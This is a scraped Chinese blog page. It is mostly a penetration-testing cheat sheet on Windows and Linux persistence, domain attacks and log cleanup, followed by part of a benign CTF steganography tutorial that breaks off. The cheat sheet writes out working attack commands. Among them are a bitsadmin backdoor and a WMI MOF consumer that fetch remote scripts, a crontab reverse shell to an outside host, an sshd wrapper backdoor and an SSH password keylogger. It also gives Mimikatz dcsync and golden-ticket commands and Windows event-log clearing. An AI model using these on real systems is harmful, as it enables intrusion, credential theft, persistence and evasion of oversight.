123HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run 4、BootExecute Key由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为： 12HKLM\\SYSTEM\\CurrentControlSet\\Control\\hivelistHKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet002\\Control\\Session Manager 5、Userinit KeyWinLogon进程加载的login scripts,具体键值： 1HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon 6、Startup Keys1234HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell FoldersHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell FoldersHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell FoldersHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders 7、Services创建服务 1sc create [ServerName] binPath&#x3D; BinaryPathName 8、Browser Helper Objects本质上是Internet Explorer启动时加载的DLL模块 1HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects 9、AppInit_DLLs加载User32.dll会加载的DLL 1HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs 10、文件关联12HKEY_LOCAL_MACHINE\\Software\\ClassesHKEY_CLASSES_ROOT 11、bitsadmin1234bitsadmin &#x2F;create backdoorbitsadmin &#x2F;addfile backdoor %comspec% %temp%\\cmd.exebitsadmin.exe &#x2F;SetNotifyCmdLine backdoor regsvr32.exe &quot;&#x2F;u &#x2F;s &#x2F;i:https:&#x2F;&#x2F;host.com&#x2F;calc.sct scrobj.dll&quot;bitsadmin &#x2F;Resume backdoor 12、mof 123456789101112131415161718192021pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;) instance of __EventFilter as $EventFilter&#123;EventNamespace &#x3D; &quot;Root\\\\Cimv2&quot;;Name &#x3D; &quot;filtP1&quot;;Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;&quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot;&quot;And TargetInstance.Second &#x3D; 1&quot;;QueryLanguage &#x3D; &quot;WQL&quot;;&#125;; instance of ActiveScriptEventConsumer as $Consumer&#123;Name &#x3D; &quot;consP1&quot;;ScriptingEngine &#x3D; &quot;JScript&quot;;ScriptText &#x3D; &quot;GetObject(\\&quot;script:https:&#x2F;&#x2F;host.com&#x2F;test\\&quot;)&quot;;&#125;; instance of __FilterToConsumerBinding&#123;Consumer &#x3D; $Consumer;Filter &#x3D; $EventFilter;&#125;; 管理员执行： 1mofcomp test.mof 13、wmi每隔60秒执行一次notepad.exe 123wmic &#x2F;NAMESPACE:&quot;\\\\root\\subscription&quot; PATH __EventFilter CREATE Name&#x3D;&quot;BotFilter82&quot;, EventNameSpace&#x3D;&quot;root\\cimv2&quot;,QueryLanguage&#x3D;&quot;WQL&quot;, Query&#x3D;&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;wmic &#x2F;NAMESPACE:&quot;\\\\root\\subscription&quot; PATH CommandLineEventConsumer CREATE Name&#x3D;&quot;BotConsumer23&quot;, ExecutablePath&#x3D;&quot;C:\\Windows\\System32\\notepad.exe&quot;,CommandLineTemplate&#x3D;&quot;C:\\Windows\\System32\\notepad.exe&quot;wmic &#x2F;NAMESPACE:&quot;\\\\root\\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter&#x3D;&quot;__EventFilter.Name&#x3D;\\&quot;BotFilter82\\&quot;&quot;, Consumer&#x3D;&quot;CommandLineEventConsumer.Name&#x3D;\\&quot;BotConsumer23\\&quot;&quot; 14、Userland Persistence With Scheduled Tasks劫持计划任务UserTask，在系统启动时加载dll 1234567891011121314151617181920212223242526272829function Invoke-ScheduledTaskComHandlerUserTask&#123;[CmdletBinding(SupportsShouldProcess &#x3D; $True, ConfirmImpact &#x3D; &#39;Medium&#39;)]Param ([Parameter(Mandatory &#x3D; $True)][ValidateNotNullOrEmpty()][String]$Command,[Switch]$Force)$ScheduledTaskCommandPath &#x3D; &quot;HKCU:\\Software\\Classes\\CLSID\\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\\InprocServer32&quot;if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name &#39;(default)&#39; -ErrorAction SilentlyContinue) -eq $null))&#123;New-Item $ScheduledTaskCommandPath -Force |New-ItemProperty -Name &#39;(Default)&#39; -Value $Command -PropertyType string -Force | Out-Null&#125;else&#123;Write-Verbose &quot;Key already exists, consider using -Force&quot;exit&#125;if (Test-Path $ScheduledTaskCommandPath) &#123;Write-Verbose &quot;Created registry entries to hijack the UserTask&quot;&#125;else&#123;Write-Warning &quot;Failed to create registry key, exiting&quot;exit&#125; &#125;Invoke-ScheduledTaskComHandlerUserTask -Command &quot;C:\\test\\testmsg.dll&quot; -Verbose 15、Netsh1netsh add helper c:\\test\\netshtest.dll 后门触发：每次调用netsh dll编写:https://github.com/outflanknl/NetshHelperBeacon 16、Shim常用方式：InjectDllRedirectShortcutRedirectEXE 17、DLL劫持通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程使用：Procmon半自动测试更精准，常规生成的dll会导致程序执行报错或中断，使用AheadLib配合生成dll劫持利用源码不会影响程序执行工具：https://github.com/sensepost/rattler工具：https://github.com/Yonsm/AheadLib 18、DoubleAgent 编写自定义Verifier provider DLL通过Application Verifier进行安装注入到目标进程执行payload每当目标进程启动，均会执行payload，相当于一个自启动的方式POC : https://github.com/Cybellum/DoubleAgent 19、waitfor.exe 不支持自启动，但可远程主动激活，后台进程显示为waitfor.exePOC : https://github.com/3gstudent/Waitfor-Persistence 20、AppDomainManager针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制 21、Office劫持Office软件的特定功能:通过dll劫持,在Office软件执行特定功能时触发后门利用VSTO实现的office后门Office加载项 Word WLL Excel XLL Excel VBA add-ins PowerPoint VBA add-ins 参考1 ：https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/参考2 ：https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/ 22、CLR无需管理员权限的后门，并能够劫持所有.Net程序POC:https://github.com/3gstudent/CLR-Injection 23、msdtc利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测利用：向 %windir%\\system32\\目录添加dll并重命名为oci.dll 24、Hijack CAccPropServicesClass and MMDeviceEnumerato利用COM组件，不需要重启系统，不需要管理员权限通过修改注册表实现POC：https://github.com/3gstudent/COM-Object-hijacking 25、Hijack explorer.exeCOM组件劫持，不需要重启系统，不需要管理员权限通过修改注册表实现 1234HKCU\\Software\\Classes\\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;HKCU\\Software\\Classes\\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125;HKCU\\Software\\Classes\\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;HKCU\\Software\\Classes\\Wow6432Node\\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125; 26、Windows FAX DLL Injection通过DLL劫持，劫持Explorer.exe对fxsst.dll的加载Explorer.exe在启动时会加载c:\\Windows\\System32\\fxsst.dll(服务默认开启，用于传真服务)将payload.dll保存在c:\\Windows\\fxsst.dll，能够实现dll劫持，劫持Explorer.exe对fxsst.dll的加载 27、特殊注册表键值在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取(使用Win32 API)，但系统能够执行(使用Native API)。《渗透技巧——“隐藏”注册表的创建》《渗透技巧——“隐藏”注册表的更多测试》 28、快捷方式后门替换我的电脑快捷方式启动参数POC : https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1 29、Logon Scripts1New-ItemProperty &quot;HKCU:\\Environment\\&quot; UserInitMprLogonScript -value &quot;c:\\test\\11.bat&quot; -propertyType string | Out-Null 30、Password Filter DLL31、利用BHO实现IE浏览器劫持Linuxcrontab每60分钟反弹一次shell给dns.wuyun.org的53端口 12#!bash(crontab -l;printf &quot;*&#x2F;60 * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;dns.wuyun.org&#x2F;53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\\rno crontab for &#96;whoami&#96;%100c\\n&quot;)|crontab - 硬链接sshd12#!bashln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;2333; 链接：ssh root@192.168.206.142 -p 2333 SSH Server wrapper123456789#!bashcd &#x2F;usr&#x2F;sbinmv sshd ..&#x2F;binecho &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshdecho &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if (getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshdecho &#39;exec &#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshdchmod u+x sshd&#x2F;&#x2F;不用重启也行&#x2F;etc&#x2F;init.d&#x2F;sshd restart 1socat STDIO TCP4:192.168.206.142:22,sourceport&#x3D;13377 SSH keyloggervim当前用户下的.bashrc文件,末尾添加 12#!bashalias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;sshpwd-&#96;date &#39;+%d%h%m%s&#39;&#96;.log -e read,write,connect -s2048 ssh&#39; source .bashrc Cymothoa_进程注入backdoor1.&#x2F;cymothoa -p 2270 -s 1 -y 7777 1nc -vv ip 7777 rootkitopenssh_rootkitKbeast_rootkit Mafix + Suterusu rootkit ToolsVegile backdoor WEB后门PHP Meterpreter后门Aspx Meterpreter后门weevelywebacoo…. 横向渗透端口渗透端口扫描 1.端口的指纹信息（版本信息） 2.端口所对应运行的服务 3.常见的默认端口号 4.尝试弱口令 端口爆破hydra 端口弱口令 NTScan Hscan 自写脚本 端口溢出smb ms08067 ms17010 ms11058 … apacheftp… 常见的默认端口1、web类(web漏洞/敏感目录)第三方通用组件漏洞: struts thinkphp jboss ganglia zabbix … 12380 web 80-89 web 8000-9090 web 2、数据库类(扫描弱口令)123451433 MSSQL 1521 Oracle 3306 MySQL 5432 PostgreSQL 50000 DB2 3、特殊服务类(未授权/命令执行类/漏洞)1234567891011443 SSL心脏滴血 445 ms08067&#x2F;ms11058&#x2F;ms17010等 873 Rsync未授权 5984 CouchDB http:&#x2F;&#x2F;xxx:5984&#x2F;_utils&#x2F; 6379 redis未授权 7001,7002 WebLogic默认弱口令，反序列 9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 11211 memcache未授权访问 27017,27018 Mongodb未授权访问 50000 SAP命令执行 50070,50030 hadoop默认端口未授权访问 4、常用端口类(扫描弱口令/端口爆破)12345621 ftp 22 SSH 23 Telnet 445 SMB弱口令扫描 2601,2604 zebra路由，默认密码zebra 3389 远程桌面 5、端口合计所对应的服务12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565721 ftp 22 SSH 23 Telnet 25 SMTP 53 DNS 69 TFTP 80 web 80-89 web 110 POP3 135 RPC 139 NETBIOS 143 IMAP 161 SNMP 389 LDAP 443 SSL心脏滴血以及一些web漏洞测试 445 SMB 512,513,514 Rexec 873 Rsync未授权 1025,111 NFS 1080 socks 1158 ORACLE EMCTL2601,2604 zebra路由，默认密码zebra案 1433 MSSQL (暴力破解) 1521 Oracle:(iSqlPlus Port:5560,7778) 2082&#x2F;2083 cpanel主机管理系统登陆 （国外用较多） 2222 DA虚拟主机管理系统登陆 （国外用较多） 2601,2604 zebra路由，默认密码zebra 3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 3306 MySQL （暴力破解） 3312&#x2F;3311 kangle主机管理系统登陆 3389 远程桌面 3690 svn 4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 4848 GlassFish web中间件 弱口令:admin&#x2F;adminadmin 5432 PostgreSQL 5900 vnc 5984 CouchDB http:&#x2F;&#x2F;xxx:5984&#x2F;_utils&#x2F; 6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 6379 redis未授权 7001,7002 WebLogic默认弱口令，反序列 7778 Kloxo主机控制面板登录 8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 8080 tomcat&#x2F;WDCd&#x2F; 主机管理系统，默认弱口令 8080,8089,9090 JBOSS 8081 Symantec AV&#x2F;Filter for MSE 8083 Vestacp主机管理系统 （国外用较多） 8649 ganglia 8888 amh&#x2F;LuManager 主机管理系统默认端口 9000 fcgi fcig php执行 9043 websphere[web中间件] 弱口令: admin&#x2F;admin websphere&#x2F; websphere ststem&#x2F;manager 9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 10000 Virtualmin&#x2F;Webmin 服务器虚拟主机管理系统 11211 memcache未授权访问 27017,27018 Mongodb未授权访问 28017 mongodb统计页面 50000 SAP命令执行 50060 hadoop 50070,50030 hadoop默认端口未授权访问 域渗透信息搜集powerview.ps1 12345678910111213141516171819202122232425Get-NetDomain - gets the name of the current user&#39;s domainGet-NetForest - gets the forest associated with the current user&#39;s domainGet-NetForestDomains - gets all domains for the current forestGet-NetDomainControllers - gets the domain controllers for the current computer&#39;s domainGet-NetCurrentUser - gets the current [domain\\]usernameGet-NetUser - returns all user objects, or the user specified (wildcard specifiable)Get-NetUserSPNs - gets all user ServicePrincipalNamesGet-NetOUs - gets data for domain organization unitsGet-NetGUIDOUs - finds domain OUs linked to a specific GUIDInvoke-NetUserAdd - adds a local or domain userGet-NetGroups - gets a list of all current groups in the domainGet-NetGroup - gets data for each user in a specified domain groupGet-NetLocalGroups - gets a list of localgroups on a remote host or hostsGet-NetLocalGroup - gets the members of a localgroup on a remote host or hostsGet-NetLocalServices - gets a list of running services&#x2F;paths on a remote host or hostsInvoke-NetGroupUserAdd - adds a user to a specified local or domain groupGet-NetComputers - gets a list of all current servers in the domainGet-NetFileServers - get a list of file servers used by current domain usersGet-NetShare - gets share information for a specified serverGet-NetLoggedon - gets users actively logged onto a specified serverGet-NetSessions - gets active sessions on a specified serverGet-NetFileSessions - returned combined Get-NetSessions and Get-NetFilesGet-NetConnections - gets active connections to a specific server resource (share)Get-NetFiles - gets open files on a serverGet-NetProcesses - gets the remote processes and owners on a remote server BloodHound​ 获取域控的方法SYSVOLSYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。相关阅读: 寻找SYSVOL里的密码和攻击GPP（组策略偏好） Windows Server 2008 R2之四管理Sysvol文件夹 SYSVOL中查找密码并利用组策略首选项 利用SYSVOL还原组策略中保存的密码 MS14-068 Kerberos1python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机 利用mimikatz将工具得到的TGT_domainuser@SERVER.COM.ccache写入内存，创建缓存证书： 12mimikatz.exe &quot;kerberos::ptc c:TGT_darthsidious@pentest.com.ccache&quot; exitnet use k: \\pentest.comc$ 相关阅读 : Kerberos的工具包PyKEK 深入解读MS14-068漏洞 Kerberos的安全漏洞 SPN扫描Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内部帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册SPN。SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。相关阅读 : 非扫描式的SQL Server发现 SPN扫描 扫描SQLServer的脚本 Kerberos的黄金门票在域上抓取的哈希 1lsadump::dcsync &#x2F;domain:pentest.com &#x2F;user:krbtgt 12345kerberos::purgekerberos::golden &#x2F;admin:administrator &#x2F;domain:域 &#x2F;sid:SID &#x2F;krbtgt:hash值 &#x2F;ticket:adinistrator.kiribikerberos::ptt administrator.kiribikerberos::tgtnet use k: \\pnet use k: \\pentest.comc$ 相关阅读 : https://adsecurity.org/?p=1640 域服务账号破解实践 Kerberos的认证原理 深刻理解windows安全认证机制ntlm＆Kerberos Kerberos的银票务黄金票据和白银票据的一些区别：Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限银票：伪造TGS，只能访问指定的服务加密方式不同：Golden Ticket由krbtgt的hash加密Silver Ticket由服务账号（通常为计算机账户）Hash加密认证流程不同：金票在使用的过程需要同域控通信银票在使用的过程不需要同域控通信相关阅读 : 攻击者如何使用Kerberos的银票来利用系统 域渗透——Pass The Ticket 域服务账号破解与上面SPN扫描类似的原理https://github.com/nidem/kerberoast获取所有用作SPN的帐户 1setspn -T PENTEST.com -Q *&#x2F;* 从Mimikatz的RAM中提取获得的门票 1kerberos::list &#x2F;export 用rgsrepcrack破解 1tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi 凭证盗窃从搜集的密码里面找管理员的密码 地址解析协议实在搞不定再搞ARP​ 获取AD哈希 使用VSS卷影副本 Ntdsutil中获取NTDS.DIT​​文件 PowerShell中提取NTDS.DIT –&gt;Invoke-NinaCopy 使用Mimikatz提取 1mimikatz lsadump::lsa &#x2F;inject exit 使用PowerShell Mimikatz 使用Mimikatz的DCSync 远程转储Active Directory凭证提取 KRBTGT用户帐户的密码数据： 1Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync &#x2F;domain:rd.adsecurity.org &#x2F;user：krbtgt&quot;exit 管理员用户帐户提取密码数据： 1Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync &#x2F;domain:rd.adsecurity.org &#x2F;user：Administrator&quot; exit NTDS.dit中提取哈希使用esedbexport恢复以后使用ntdsxtract提取 AD持久化活动目录持久性技巧https://adsecurity.org/?p=1929DS恢复模式密码维护DSRM密码同步 Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320:https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：[巧用DSRM密码同步将域控权限持久化](http://drops.xmd5.com/static/drops/tips-9297.html) DCshadow Security Support Provider简单的理解为SSP就是一个DLL，用来实现身份认证 12privilege::debugmisc::memssp 这样就不需要重启c:/windows/system32可看到新生成的文件kiwissp.log SID HistorySID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户 1mimikatz &quot;privilege::debug&quot; &quot;misc::addsid bobafett ADSAdministrator&quot; AdminSDHolder＆SDProp 利用AdminSDHolder＆SDProp（重新）获取域管理权限 组策略https://adsecurity.org/?p=2716策略对象在持久化及横向渗透中的应用 Hook PasswordChangeNotifyhttp://wooyun.jozxing.cc/static/drops/tips-13079.html TIPS《域渗透——Dump Clear-Text Password after KB2871997 installed》《域渗透——Hook PasswordChangeNotify》 可通过Hook PasswordChangeNotify实时记录域控管理员的新密码 《域渗透——Local Administrator Password Solution》 域渗透时要记得留意域内主机的本地管理员账号 《域渗透——利用SYSVOL还原组策略中保存的密码》 相关工具BloodHound CrackMapExec DeathStar 利用过程：http://www.freebuf.com/sectool/160884.html 在远程系统上执行程序 At Psexec WMIC Wmiexec Smbexec Powershell remoting DCOM IOT相关 1、路由器 routersploit 2、打印机 PRET 3、IOT exp https://www.exploitee.rs/ 4、相关OWASP-Nettackerisficsmaster 中间人 Cain Ettercap Responder MITMf 3r/MITMf) 规避杀软及检测Bypass ApplockerUltimateAppLockerByPassList https://lolbas-project.github.io/ bypassAV Empire PEspin Shellter Ebowla Veil PowerShell Python 代码注入技术Process Doppelgänging … 痕迹清理Windows日志清除获取日志分类列表： 1wevtutil el &gt;1.txt 获取单个日志类别的统计信息：eg. 1wevtutil gli &quot;windows powershell&quot; 回显： 1234567creationTime: 2016-11-28T06:01:37.986ZlastAccessTime: 2016-11-28T06:01:37.986ZlastWriteTime: 2017-08-08T08:01:20.979ZfileSize: 1118208attributes: 32numberOfLogRecords: 1228oldestRecordNumber: 1 查看指定日志的具体内容： 1wevtutil qe &#x2F;f:text &quot;windows powershell&quot; 删除单个日志类别的所有信息： 1wevtutil cl &quot;windows powershell&quot; 破坏Windows日志记录功能利用工具 Invoke-Phant0m Windwos-EventLog-Bypass msf1run clearlogs 1clearev 3389登陆记录清除1234@echo off@reg delete &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default&quot; &#x2F;va &#x2F;f@del &quot;%USERPROFILE%\\My Documents\\Default.rdp&quot; &#x2F;a@exit","categories":[],"tags":[]},{"title":"CTF赛前培训____杂项","slug":"CTF赛前培训____杂项","date":"2020-07-25T01:17:19.098Z","updated":"2020-06-10T05:56:54.000Z","comments":true,"path":"2020/07/25/CTF赛前培训____杂项/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/CTF%E8%B5%9B%E5%89%8D%E5%9F%B9%E8%AE%AD____%E6%9D%82%E9%A1%B9/","excerpt":"","text":"信息安全信息安全介绍 CTF的目标是什么 CTF比赛形式 CTF解题模式的题目类型1、web安全：通过浏览器访问你题目服务器上的王炸你，寻找网站漏洞（sql注入，xss文件上传，包含漏洞，xxe，ssrf，命令执行，代码审计等），利用网站漏洞获得服务器的部分或全部权限，拿到flag，通常包含分值最大的web渗透题； 2、逆向工程（Reverse）：题目就是一个软件，但通常没有软件的源代码；需要利用工具对软件进行反编译甚至反汇编，从而理解软件内部逻辑和原理，找出flag计算相关的算法并破解这个算法，获取flag 3、漏洞挖掘与漏洞利用（PWN,EXPLOIT）：访问一个本地或远程的二进制服务程序，通过逆向工程找出程序存在的漏洞，并利用程序中的漏洞获取远程服务器的部分或全部权限，拿到flag； 4、密码学（Crypto）：分析提米中的密码算法与协议，利用算法或协议的弱点来计算秘钥或对密文进行解密，从而获取flag。 对密码方式进行解码，比如：base64，或者一些加密算法。 加密算法：凯撒密码等等 摘要算法：MD5、SHA1等等，合起来就是密码学 5、调查取证（Misc）：也可以称为杂项。。。利用隐写术等保护技术将信息隐藏在图像、音频、视频、压缩包中，或者信息就在一段内存镜像或网络流量中，尝试将隐藏的信息恢复出来即可获得flag 6、移动安全（Mobile）：对安卓和IOS系统的理解，逆向工程等知识。 难度排序从上往下： ① 杂项（Misc） ② 密码学（Crypto） ③ web安全 ④ 逆向（Reverse） ⑤ 二进制破解（PWN） 第一个难度最低。 CTF攻防模式 CTF备战思路 CTF真题演练场hackingLab实验室：http://hackinglab.cn 实验吧：http://www.shiyanbar.com/ctf/practice i春秋CTF大本营：https://www.ichunqiu.com/competition 合天实验室：www.hetianlab.com UssLab Jarvis OJ Platform：https://www.jarvisoj.com XCTF实训平台：http://oj.xctf.org.cn Capture the Flag：http://captf.com CTF Time：https://ctftime.org BugkuCTF：http://ctf.bugku.com/login HackgameSQL注入练习：http://redtiger.labs.overthewire.org Xss game：http://prompt.ml/0 XSS challenges：http://xss-quiz.int21h.jp 红客闯关游戏：http://hkyx.myhack58.com 梦之光芒Hack游戏：http://monyer.com/game CTF-Writeup实验吧Writeup：http://hebin.me 360播报：http://bobao.360.cn/ctf 安全脉搏：https://www.secpulse.com/archives/category/exclusive/ctf-writeup github上的writeup： https://github.com/ctfs https://github.com/VulnHub/ctf-writeups 文件操作与隐写文件类型识别 常见的文件头类型 每个文件类型的文件头是不同的。 可以使用文本软件来查看16进制，看看是否与文件头对应 文件头残缺/错误​ 通常文件无法正常打开有两种情况，一种是文件头部残缺，另一种是文件头部字段错误。winhex程序添加相应的文件头，针对头部字段错误，可以找一个相同类型的文件进行替换。 格式：file 文件名 如果文件头确实或者错误，我们就要进行修复 当文件查看不了的时候显示这是一个data文件，告诉你这就是一串数据，它也不知道这是什么类型的文件， 如果缺失了，可以用notpad++进行修改16进制，将正确的文件头输入 文件分离操作1、Binwalk​ Binwalk是linux下用来分析和分离文件的工具，可以快速分辨文件是否由多个文件合并而成，并将文件进行分离，如果分离成功会在目标文件的目录 同目录下生成一个形如_ 文件名 _extracted的文件目录，目录中有分离后的文件 用法： 分析文件：binwalk filename 分离文件：binwalk -e filename binwalk是linux下的一款工具。当你拿到一个文件的时候如果图片中没有任何隐藏文件那就会返回文件格式如果文件中隐藏了文件，使用binwalk的时候就会返回隐藏的文件 这个图片是里面没有任何隐藏的文件所以只返回了文件格式 如果是图片中隐藏了内容的话，会分析出其中的内容 可以看到第二行的 0x596F后面是ZIP所以需要使用binwalk -e 文件名 来讲文件中的内容分离出来，可以看到这样就多出来一个文件 打开文件原图片的文件可以看到多了一个文件夹 打开这个文件夹发现里面还有一个压缩包和一个key.txt的文件，这个key.txt就是压缩包中的 文件，因为binwalk会自动将压缩包进行解压 2、foremost还有一种就是，比如binwalk不能使用了，无法进行分离， 可以使用foremost 文件名 -o 自定义文件名 foremost并不能像binwalk一样进行压缩包解压，他会详细的将文件分类，jpg就在jpg文件夹中，压缩包就在zip文件夹中，而且还会生成一个日志 要获取flag文件就要自行将zip进行解压。获取key值 3、dd​ 当文件自动分离出错或者因为其他原因无法自动分离时，可以使用dd实现文件手动分离。 格式： dd if=源文件 of=目标文件名 bs=1 skip= 开始分离的字节数 参数说明： if=file #输入文件名，缺省为标准输入 of=file #输出文件名，缺省为标准输出。 bs=bytes #同时设置读写块的大小为bytes，可代替ibs和obs。 skip=blocks #从输入文件开头跳过blocks个块后再开始复制 小例子： 这里的bs=5和count=1的意思就是将前面5个数保存到2.txt，剩下的去掉 skip的意思就是跳过多少块，因为设置的bs是5也就是前5个数，然后skip跳过第一块，就将1-5跳过了。 4、手动除了使用dd外，还可以手进行文件分离，将目标文件放到Notepad++中打开后是乱码这是正常的，点开里面的插件选择HEX-Editor插件将其转换成16进制，找出分离的16进制，复制出来，将文件格式改为zip 5、010Editor将16进制字符文件导入保存操作： 比如获得一个文件将其打开发现是16进制的，这就说明让其把16进制变成一个压缩包 使用010 Editor导入这个文件其实在这就能看到他是一个Rar文件，这样我们就进行另存为将其存为Rar文件。 发现桌面已经确实存为了rar后缀的压缩包 文件合并1、Linux下文件合并linux下，通常对文件名相似的文件要进行批量合并 格式：cat 合并的文件 &gt; 输出的文件 这两种方法都可以，*代表了多个 完整性检测：linux下计算文件md5 格式：md5sum 文件名 2、Windows下的文件合并Windows下，通常需要对文件名相似的文件进行批量合并 格式：copy /B 合并的文件输出的文件命令 完整性检测：windows下计算文件md5： 格式：certutil -hashfile 文件名 md5 文件内容隐写文件内容隐写，就是直接将KEY以十六进制的形式卸载文件中，通常在文件的开头或结尾部分，分析时通常重点观察文件开头和结尾部分。如果在文件中间部分，通常搜索关键字KEY或者flag来查找隐藏内容（每个工具都有查找功能使用查找功能进行查找）。 Windows下，搜索隐写的文件内容 1、Winhex / 010Eidtor​ 将要识别的文件拖入010Eidtor(十六进制)，查找具有关键字或明显与文件内容不和谐的部分，通常优先观察文件首部和尾部，搜索flag或key等关键字，最后拖动滚轮寻找。 2、Notepad++​ 使用notepad++打开文件，查看文件头尾是否有含有关键字的字符串，搜索flag或key等关键字，最后拖动滚轮寻找。 另外通过安装插件HEX-Editor可以实现010Editor 图片隐写图片隐写的一些常见隐写方法 细微的颜色差别 GIF图多帧隐藏 颜色通道隐藏 不同帧图信息隐藏 不同帧对比隐写 EXIF信息隐藏 图片修复 图片头修复 图片尾修复 CRC校验修复 长、宽、高度修复 最低有效位LSB隐写 图片加密 Stegdetect outguess Jphide F5 图片文件隐写1、firework使用winhex打开文件时会看到文件头部中包含firework的标识，通过 firework / ps 可以找到隐藏图片。 使用场景：查看隐写的图片文件 最底下是每一帧的图片 2、Exif​ Exif按照JPEG的规格在JPEG中插入一些图像 / 数字相机的信息数据以及缩略图像，可以通过与JPEG兼容的互联网浏览器 / 图片浏览器 / 图像处理等一些软件来查看Exif格式的图像文件，就跟浏览器通常的JPEG图像文件一样。 图片右键属性，查看详细信息，在相关选项卡中查找flag信息 3、Stegsolve​ 当两张jpg图片外观、大小、像素都基本相同时，可以考虑进行结合分析，即将两个文件的像素RGB值进行XOR、ADD、SUB等操作，看能否得到有用的信息，StegSolve可以方便的进行这些操作。 1、打开一张图片，点击analyse中的image combiner 筛选有用的图片进行save保存，这里显示的二维码是错误的，黑白颜色相反，所以需要进行取反处理，直接在画图中选中二维码右键取反就可以 如果是二维码GIF的话会看到一直动，就可以使用Stegsolve工具将二维码没帧都给截取下来 图片文件隐写-LSB4、LSB(最低有效位 Least Significant Bit)​ LSB替换隐写基本思想是用嵌入的秘密信息取代载体图像的最低比特位，原来的7个高位平面与替代秘密信息的最低位平面组合成隐藏信息的新图形。 像素三原色（RGB） 